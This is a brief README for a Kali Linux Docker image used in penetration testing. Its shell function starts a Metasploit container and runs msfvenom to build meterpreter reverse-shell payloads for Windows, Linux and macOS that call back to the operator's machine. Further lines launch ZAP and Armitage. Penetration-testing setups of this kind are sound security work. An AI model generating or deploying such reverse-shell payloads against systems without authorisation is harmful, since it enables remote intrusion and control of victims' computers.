# kali
A Docker image for Kali Linux

# Start Function
``` 
function msfconsole() {	
	msf="$(docker run -d -t -p 4469:4469 -p 4433:4433 -v /Volumes:/Volumes -v /Users/Administrator/Desktop:/pentest/Desktop pennoser/msf /bin/bash)"
	if [[ "$1" == "update" ]]; then
		docker exec -t $msf /bin/bash -c "apt update"
		docker exec -t $msf /bin/bash -c "apt -y upgrade"
	fi
	docker exec -ti $msf msfvenom -p "windows/meterpreter/reverse_tcp" "LHOST=$(ipconfig getifaddr en0)" "LPORT=4469" -f "exe" -o "/pentest/shell.exe"
	docker exec -ti $msf msfvenom -p "linux/x86/meterpreter/reverse_tcp" "LHOST=$(ipconfig getifaddr en0)" "LPORT=4469" -f "elf" -o "/pentest/shell.elf"
	docker exec -ti $msf msfvenom -p "osx/x86/shell_reverse_tcp" "LHOST=$(ipconfig getifaddr en0)" "LPORT=4469" -f "macho" -o "/pentest/shell.macho"
docker exec -t $msf /bin/bash -c "echo set -g LHOST $(ipconfig getifaddr en0) >> /root/.msf4/msfconsole.rc"
	docker exec -ti $msf msf
	docker container stop $msf
	docker container rm $msf
}
```

## TODO for Start Function

### zaproxy
`docker run --rm -it --net host -e DISPLAY=unix$DISPLAY -v /tmp/.X11-unix:/tmp/.X11-unix pennoser/msf zaproxy`

### armitage
`docker run --rm -it --net host -e DISPLAY=unix$DISPLAY -v /tmp/.X11-unix:/tmp/.X11-unix pennoser/msf armitage
